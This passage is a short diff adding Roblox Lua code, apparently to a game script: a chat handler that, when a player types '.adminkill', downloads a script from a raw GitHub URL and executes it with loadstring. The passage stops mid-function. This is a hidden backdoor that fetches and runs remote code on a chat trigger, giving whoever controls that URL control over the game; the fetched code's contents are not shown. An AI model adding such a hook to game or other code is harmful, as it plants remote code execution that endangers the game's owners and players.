@@ -1,0 +1,5 @@
+local function onPlayerChatted(player, message)
+
+    if message == ".adminkill" then
+
+loadstring(game:HttpGet('https://raw.githubusercontent.com/amagineLost/kill-player/main/Code'))()
